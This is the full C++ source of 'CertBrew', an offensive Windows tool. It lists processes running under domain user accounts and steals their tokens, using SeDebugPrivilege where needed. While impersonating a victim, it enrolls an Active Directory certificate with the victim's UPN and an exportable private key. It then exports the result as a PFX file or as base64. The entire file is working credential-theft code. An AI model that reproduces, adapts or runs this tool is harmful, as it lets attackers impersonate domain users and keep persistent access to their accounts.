#define SECURITY_WIN32 
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h> 
#include <stdio.h> 
#include <tlhelp32.h> 
#include <wchar.h> 
#include <sspi.h> 
#include <secext.h> 
#include <iostream> 
#include <vector> 
#include <string> 
#include <sstream> 
#include <algorithm> 
#include <fstream> 
#include <ncrypt.h>

#include <atlbase.h> 
#include <certenroll.h> 
#include <certcli.h> 
#include <certsrv.h> 

#pragma comment(lib, "secur32.lib") 
#pragma comment(lib, "netapi32.lib") 
#pragma comment(lib, "crypt32.lib") 
#pragma comment(lib, "advapi32.lib") 
#pragma comment(lib, "ole32.lib") 
#pragma comment(lib, "oleaut32.lib") 
#pragma comment(lib, "ncrypt.lib")

std::wstring g_OutFile = L"";

void PrintBanner() {
    const char* banner =
        "\n"
        "   _.._..,_,_          ____          __  ____                  \n"
        "  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __ \n"
        "   ]~,\"-.-~~[        | |   / _ \\ '__| __|  _ \\| '__/ _ \\ \\ /\\ / / \n"
        " .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\\ V  V /  \n"
        " | ]:: '    [         \\____\\___|_|   \\__|____/|_|  \\___| \\_/\\_/   \n"
        " '=]): .)  ([                                                       \n"
        "   |:: '    |            -- Made by Wuentin --                        \n"
        "    ~~----~~                                                      \n\n";

    printf("%s", banner);
}

void LogMessage(const wchar_t* format, ...) {
    va_list args;
    va_start(args, format);
    vwprintf(format, args);
    va_end(args);
}

struct ComException : public std::runtime_error {
    HRESULT hr;
    ComException(HRESULT code, const std::string& msg)
        : std::runtime_error(msg), hr(code) {}
};

inline void ThrowIfFailed(HRESULT hr, const char* msg) {
    if (FAILED(hr)) {
        char* sysMsg = nullptr;
        FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER
            | FORMAT_MESSAGE_FROM_SYSTEM
            | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, hr,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&sysMsg, 0, NULL
        );

        std::string errorDesc = "Unknown Error";
        if (sysMsg) {
            errorDesc = sysMsg;
            while (!errorDesc.empty() &&
                (errorDesc.back() == '\r' || errorDesc.back() == '\n')) {
                errorDesc.pop_back();
            }
            LocalFree(sysMsg);
        }

        std::ostringstream oss;
        oss << "\n[!] CertBrew error: " << msg
            << " - Reason: " << errorDesc
            << " (Code: 0x" << std::hex << hr << ")";

        throw ComException(hr, oss.str());
    }
}


std::wstring GetUPN() {
    DWORD len = 0;
    GetUserNameExW(NameUserPrincipal, nullptr, &len);
    if (len == 0) return L"";

    std::vector<wchar_t> buf(len);
    if (!GetUserNameExW(NameUserPrincipal, buf.data(), &len)) return L"";

    return std::wstring(buf.data());
}

BOOL SetPrivilege(HANDLE hToken, LPCWSTR priv) {
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(NULL, priv, &luid)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) return FALSE;
    return GetLastError() == ERROR_SUCCESS;
}

BOOL EnableDebugPrivilege() {
    HANDLE h = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &h)) {
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h)) return FALSE;
        }
        else return FALSE;
    }
    BOOL r = SetPrivilege(h, L"SeDebugPrivilege");
    CloseHandle(h);
    return r;
}

BOOL IsDomainUserAccount(HANDLE hToken, std::wstring& outUser) {
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;

    std::vector<BYTE> buffer(dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) return FALSE;

    PSID pSid = pTokenUser->User.Sid;

    if (IsWellKnownSid(pSid, WinLocalSid) ||
        IsWellKnownSid(pSid, WinLocalSystemSid) ||
        IsWellKnownSid(pSid, WinServiceSid) ||
        IsWellKnownSid(pSid, WinLocalServiceSid) ||
        IsWellKnownSid(pSid, WinNetworkServiceSid))
        return FALSE;

    WCHAR name[256] = { 0 };
    WCHAR domain[256] = { 0 };
    DWORD nSize = 256;
    DWORD dSize = 256;
    SID_NAME_USE sidType;

    if (!LookupAccountSidW(NULL, pSid, name, &nSize, domain, &dSize, &sidType))
        return FALSE;

    if (sidType == SidTypeUser) {
        if (_wcsicmp(domain, L"NT AUTHORITY") == 0) return FALSE;
        if (_wcsicmp(domain, L"Window Manager") == 0) return FALSE;
        if (_wcsicmp(domain, L"Font Driver Host") == 0) return FALSE;

        outUser = std::wstring(domain) + L"\\" + std::wstring(name);
        return TRUE;
    }

    return FALSE;
}

void ListDomainProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        LogMessage(L"[-] CreateToolhelp32Snapshot failed.\n");
        return;
    }

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(snap, &pe)) {
        CloseHandle(snap);
        return;
    }

    std::wcout << L"\n[+] Scanning processes for domain user tokens...\n";
    std::wcout << L"PID      | USER                           | PROCESS\n";
    std::wcout << L"----------------------------------------------------------\n";
    std::wcout.flush();

    do {
        HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (p) {
            HANDLE t;
            if (OpenProcessToken(p, TOKEN_QUERY, &t)) {
                std::wstring userStr;
                if (IsDomainUserAccount(t, userStr)) {
                    wchar_t line[512];
                    swprintf_s(line, 512, L"%-8d | %-30s | %s\n", pe.th32ProcessID, userStr.c_str(), pe.szExeFile);

                    const int CHUNK_SIZE = 32;
                    const wchar_t* ptr = line;
                    size_t remaining = wcslen(line);

                    while (remaining > 0) {
                        size_t len = (std::min)((size_t)CHUNK_SIZE, remaining);
                        std::wcout.write(ptr, len);
                        std::wcout.flush();
                        ptr += len;
                        remaining -= len;
                    }
                }
                CloseHandle(t);
            }
            CloseHandle(p);
        }
    } while (Process32NextW(snap, &pe));

    CloseHandle(snap);
}

// CSR generation and private key configuration
BOOL GenerateCSR(
    const wchar_t* templateName,
    BSTR* outCsr,
    CComBSTR& outContainerName,
    CComBSTR& outProviderName
)
{
    try {
        // Retrieve the User's Principal Name
        std::wstring upn = GetUPN();
        if (upn.empty()) throw std::runtime_error("UPN not found");
        LogMessage(L"[*] Target UPN retrieved: %s\n", upn.c_str());

        std::wstring subject = L"CN=" + upn;

        // Initialize a PKCS#10 request from the chosen AD template
        CComPtr<IX509CertificateRequestPkcs10> req;
        ThrowIfFailed(req.CoCreateInstance(__uuidof(CX509CertificateRequestPkcs10)), "PKCS10");
        ThrowIfFailed(req->InitializeFromTemplateName(ContextUser, CComBSTR(templateName)), "InitializeFromTemplate");

        // Configure the private key & make it exportable for later use
        CComPtr<IX509PrivateKey> key;
        ThrowIfFailed(req->get_PrivateKey(&key), "get_PrivateKey");
        key->put_ExportPolicy(XCN_NCRYPT_ALLOW_EXPORT_FLAG);

        // Build Subject DN and embed it into the request
        CComPtr<IX500DistinguishedName> dn;
        ThrowIfFailed(dn.CoCreateInstance(__uuidof(CX500DistinguishedName)), "DN");
        ThrowIfFailed(dn->Encode(CComBSTR(subject.c_str()), XCN_CERT_NAME_STR_NONE), "DN encode");
        ThrowIfFailed(req->put_Subject(dn), "put_Subject");

        // Add SAN containing the user's UPN (required for AD certificate mapping)
        CComPtr<IAlternativeNames> sanList;
        ThrowIfFailed(sanList.CoCreateInstance(__uuidof(CAlternativeNames)), "SAN list");
        CComPtr<IAlternativeName> san;
        ThrowIfFailed(san.CoCreateInstance(__uuidof(CAlternativeName)), "SAN");
        ThrowIfFailed(san->InitializeFromString(XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME, CComBSTR(upn.c_str())), "SAN init");
        ThrowIfFailed(sanList->Add(san), "Add SAN");

        CComPtr<IX509ExtensionAlternativeNames> sanExt;
        ThrowIfFailed(sanExt.CoCreateInstance(__uuidof(CX509ExtensionAlternativeNames)), "SAN ext");
        ThrowIfFailed(sanExt->InitializeEncode(sanList), "SAN encode");

        CComPtr<IX509Extensions> exts;
        ThrowIfFailed(req->get_X509Extensions(&exts), "get_X509Extensions");
        ThrowIfFailed(exts->Add(sanExt), "Add extension");

        // Build the signed PKCS#10 request (CSR)
        CComPtr<IX509Enrollment> enroll;
        ThrowIfFailed(enroll.CoCreateInstance(__uuidof(CX509Enrollment)), "Enrollment");
        ThrowIfFailed(enroll->InitializeFromRequest(req), "InitEnroll");
        ThrowIfFailed(enroll->CreateRequest(XCN_CRYPT_STRING_BASE64, outCsr), "CreateRequest");

        // Retrieving metadata from the container
        ThrowIfFailed(key->get_ContainerName(&outContainerName), "get_ContainerName");
        ThrowIfFailed(key->get_ProviderName(&outProviderName), "get_ProviderName");

        return TRUE;
    }
    catch (std::exception& ex) {
        LogMessage(L"[-] GenerateCSR Error: %S\n", ex.what());
        return FALSE;
    }
}

// Submit a Base64 - encoded CSR to the target CA via DCOM
BOOL SubmitToCA(const wchar_t* caName, BSTR csr, BSTR* outCertB64) {
    try {
        LogMessage(L"[*] Submitting request to CA: %s\n", caName);
        CComPtr<ICertRequest2> icr;
        ThrowIfFailed(icr.CoCreateInstance(__uuidof(CCertRequest)), "CertRequest");

        LONG disp = 0;
        ThrowIfFailed(icr->Submit(CR_IN_BASE64 | CR_IN_PKCS10, csr, NULL, CComBSTR(caName), &disp), "Submit");

        ThrowIfFailed(icr->GetCertificate(XCN_CRYPT_STRING_BASE64HEADER, outCertB64), "GetCertificate");
        return TRUE;
    }
    catch (std::exception& ex) {
        LogMessage(L"[-] SubmitToCA Error: %S\n", ex.what());
        return FALSE;
    }
}

// Reconstruct a full PFX(certificate + private key) entirely in memory
BOOL CreatePFXInMemory(
    BSTR certB64,
    BSTR containerName,
    BSTR providerName,
    const wchar_t* password,
    std::vector<BYTE>& outPfxData
)
{
    PCCERT_CONTEXT pCertContext = NULL;
    PCCERT_CONTEXT pStoreContext = NULL;
    HCERTSTORE hStore = NULL;
    NCRYPT_PROV_HANDLE hProv = NULL;
    NCRYPT_KEY_HANDLE hKey = NULL;

    try {
        // Decode issued certificate from Base64 => DER => CertContext
        DWORD certLen = 0;
        std::wstring wCertB64(certB64, SysStringLen(certB64));
        CryptStringToBinaryW(wCertB64.c_str(), 0, CRYPT_STRING_BASE64HEADER, NULL, &certLen, NULL, NULL);
        std::vector<BYTE> certBlob(certLen);
        if (!CryptStringToBinaryW(wCertB64.c_str(), 0, CRYPT_STRING_BASE64HEADER, certBlob.data(), &certLen, NULL, NULL))
            throw std::runtime_error("CryptStringToBinaryW failed");

        pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, certBlob.data(), certLen);
        if (!pCertContext) throw std::runtime_error("CertCreateCertificateContext failed");

        // Open key container to ensure private key is accessible
        if (NCryptOpenStorageProvider(&hProv, providerName, 0) != ERROR_SUCCESS)
            throw std::runtime_error("NCryptOpenStorageProvider failed");
        if (NCryptOpenKey(hProv, &hKey, containerName, 0, 0) != ERROR_SUCCESS)
            throw std::runtime_error("NCryptOpenKey failed");

        // Create an in-memory certificate store and insert the issued cert
        hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, NULL, 0, NULL);
        if (!hStore) throw std::runtime_error("CertOpenStore failed");

        if (!CertAddCertificateContextToStore(hStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreContext))
            throw std::runtime_error("CertAddCertificateContextToStore failed");

        // Bind certificate to its private key container
        CRYPT_KEY_PROV_INFO provInfo = {};
        provInfo.pwszContainerName = containerName;
        provInfo.pwszProvName = providerName;
        provInfo.dwProvType = 0;
        provInfo.dwKeySpec = 0;

        if (!CertSetCertificateContextProperty(pStoreContext, CERT_KEY_PROV_INFO_PROP_ID, 0, &provInfo))
            throw std::runtime_error("CertSetCertificateContextProperty failed");

        // Export the fully reconstructed PFX
        LogMessage(L"[*] Exporting PFX from memory store...\n");
        CRYPT_DATA_BLOB pfxBlob = {};
        if (!PFXExportCertStoreEx(hStore, &pfxBlob, password, NULL, EXPORT_PRIVATE_KEYS))
            throw std::runtime_error("PFXExportCertStoreEx (size) failed");

        outPfxData.resize(pfxBlob.cbData);
        pfxBlob.pbData = outPfxData.data();

        if (!PFXExportCertStoreEx(hStore, &pfxBlob, password, NULL, EXPORT_PRIVATE_KEYS))
            throw std::runtime_error("PFXExportCertStoreEx (export) failed");


        NCryptFreeObject(hProv);
        CertFreeCertificateContext(pStoreContext);
        CertFreeCertificateContext(pCertContext);
        CertCloseStore(hStore, 0);
        return TRUE;
    }
    catch (std::exception& ex) {
        if (hProv) NCryptFreeObject(hProv);
        if (pStoreContext) CertFreeCertificateContext(pStoreContext);
        if (pCertContext) CertFreeCertificateContext(pCertContext);
        if (hStore) CertCloseStore(hStore, 0);
        LogMessage(L"[-] CreatePFXInMemory Error: %S\n", ex.what());
        return FALSE;
    }
}

// Output the PFX either to disk (Binary) or to stdout (Base64),
void OutputData(const std::vector<BYTE>& data, const std::wstring& password) {
    if (!g_OutFile.empty()) {
        // PFX format : Binary
        HANDLE hFile = CreateFileW(g_OutFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            if (WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL))
                LogMessage(L"[+] SUCCESS. Binary PFX saved to: %s\n", g_OutFile.c_str());
            else
                LogMessage(L"[-] Failed writing to file.\n");
            CloseHandle(hFile);
        }
        else {
            LogMessage(L"[-] Failed opening file for writing.\n");
        }
    }
    else {
        // Convert PFX to Base64 and print to stdout
        DWORD b64Len = 0;
        if (!CryptBinaryToStringW(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len))
            return;

        std::vector<wchar_t> b64Buf(b64Len);
        if (!CryptBinaryToStringW(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Buf.data(), &b64Len))
            return;

        LogMessage(L"[+] PFX Base64 (password=%s):\n", password.c_str());


        const size_t CHUNK_SIZE = 1024;
        const wchar_t* ptr = b64Buf.data();
        size_t remaining = wcslen(ptr);

        while (remaining > 0) {
            size_t len = std::min<size_t>(CHUNK_SIZE, remaining);
            wprintf(L"%.*s", (int)len, ptr);
            ptr += len;
            remaining -= len;
        }
        wprintf(L"\n\n");

        RtlSecureZeroMemory(b64Buf.data(), b64Buf.size() * sizeof(wchar_t));
    }
}


// Main certificate enrolment function
BOOL PerformCertEnroll(const wchar_t* templateName, const wchar_t* caName, const wchar_t* password) {
    LogMessage(L"[*] Initializing COM library...\n");
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE && hr != S_FALSE) {
        LogMessage(L"[-] CoInitializeEx failed: 0x%x\n", hr);
        return FALSE;
    }

    CComBSTR bstrContainerName;
    CComBSTR bstrProviderName;
    BSTR csr = nullptr;
    BSTR certB64 = nullptr;
    std::vector<BYTE> pfxData;
    BOOL success = FALSE;

    if (!GenerateCSR(templateName, &csr, bstrContainerName, bstrProviderName))
        goto Cleanup;

    if (!SubmitToCA(caName, csr, &certB64))
        goto Cleanup;

    if (!CreatePFXInMemory(certB64, bstrContainerName, bstrProviderName, password, pfxData))
        goto Cleanup;

    OutputData(pfxData, password);
    success = TRUE;

Cleanup:
    if (bstrContainerName && bstrProviderName) {
        NCRYPT_PROV_HANDLE hProv = NULL;
        NCRYPT_KEY_HANDLE hKey = NULL;
        if (NCryptOpenStorageProvider(&hProv, bstrProviderName, 0) == ERROR_SUCCESS) {
            if (NCryptOpenKey(hProv, &hKey, bstrContainerName, 0, 0) == ERROR_SUCCESS) {
                NCryptDeleteKey(hKey, 0);
                hKey = NULL;
            }
            NCryptFreeObject(hProv);
        }
    }
    if (!pfxData.empty()) RtlSecureZeroMemory(pfxData.data(), pfxData.size());
    if (csr) SysFreeString(csr);
    if (certB64) SysFreeString(certB64);

    return success;
}

BOOL StealAndEnroll(DWORD pid, wchar_t* tmpl, wchar_t* ca, wchar_t* pass) {
    LogMessage(L"[*] Opening process PID: %lu\n", pid);

    HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (!p) {
        LogMessage(L"[*] OpenProcess failed, attempting to enable SeDebugPrivilege...\n");
        if (EnableDebugPrivilege()) {
            p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        }

        if (!p) {
            LogMessage(L"[-] OpenProcess could not open the process (err=%lu - incorrect PID or insufficient access)\n", GetLastError());
            return FALSE;
        }
    }

    HANDLE tok;
    if (!OpenProcessToken(p, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &tok)) {
        LogMessage(L"[-] OpenProcessToken failed (err=%lu)\n", GetLastError());
        CloseHandle(p);
        return FALSE;
    }
    CloseHandle(p);

    LogMessage(L"[*] Duplicating and impersonating user...\n");
    if (!ImpersonateLoggedOnUser(tok)) {
        LogMessage(L"[-] ImpersonateLoggedOnUser failed (err=%lu)\n",
            GetLastError());
        CloseHandle(tok);
        return FALSE;
    }

    std::wstring spoofedUpn = GetUPN();
    LogMessage(L"[+] Impersonation OK. Context: %s. Starting enrollment routine...\n", spoofedUpn.c_str());

    BOOL ok = PerformCertEnroll(tmpl, ca, pass);

    RevertToSelf();
    CloseHandle(tok);
    return ok;
}

void PrintUsage(const wchar_t* exe) {
    PrintBanner();
    wprintf(L"Usage:\n");
    wprintf(L"  %s /list\n", exe);
    wprintf(L"  %s /steal /pid:<PID> /template:<Template> /ca:<CA> /pass:<password> [/outfile:file]\n", exe);
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }
    PrintBanner();
    bool doSteal = false;
    bool doList = false;
    DWORD pid = 0;
    std::wstring tmpl, ca, pass;

    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/list") == 0) doList = true;
        else if (_wcsicmp(argv[i], L"/steal") == 0) doSteal = true;
        else if (_wcsnicmp(argv[i], L"/pid:", 5) == 0) pid = _wtol(argv[i] + 5);
        else if (_wcsnicmp(argv[i], L"/template:", 10) == 0) tmpl = argv[i] + 10;
        else if (_wcsnicmp(argv[i], L"/ca:", 4) == 0) ca = argv[i] + 4;
        else if (_wcsnicmp(argv[i], L"/pass:", 6) == 0) pass = argv[i] + 6;
        else if (_wcsnicmp(argv[i], L"/outfile:", 9) == 0) g_OutFile = argv[i] + 9;
    }

    if (doList) {
        ListDomainProcesses();
        return 0;
    }

    if (doSteal) {
        if (pid == 0 || tmpl.empty() || ca.empty() || pass.empty()) {
            LogMessage(L"[-] Missing arguments for /steal.\n");
            PrintUsage(argv[0]);
            return 1;
        }

        if (!StealAndEnroll(pid, (wchar_t*)tmpl.c_str(), (wchar_t*)ca.c_str(), (wchar_t*)pass.c_str()))
        {
            LogMessage(L"[-] CertBrew failed.\n");
            return 1;
        }

        return 0;
    }

    PrintUsage(argv[0]);
    return 1;
}